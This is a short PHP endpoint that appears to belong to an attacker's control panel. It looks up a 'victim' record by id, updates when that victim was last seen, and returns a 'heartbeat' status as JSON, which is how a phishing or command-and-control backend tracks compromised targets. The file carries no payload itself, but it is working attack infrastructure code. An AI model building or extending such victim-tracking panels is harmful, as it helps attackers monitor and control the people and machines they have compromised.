<?php

require_once( 'functions.php' );

if ( isset( $_GET[ 'id' ] ) ) {

	$curvictim = getVictim( $pdo, intval( $_GET[ 'id' ] ) );

	if ( !empty( $curvictim ) ) {

		updateVictim( $pdo, $_GET[ 'id' ], [
			'seen_at' => intval(time())
		] );

		echo( json_encode( [ 'status' => $curvictim[ 'heartbeat' ] ] ) );

	} else {

		die( json_encode( [ 'status' => 'error' ] ) );

	}

} else {

	die( json_encode( [ 'status' => 'error' ] ) );

}

?>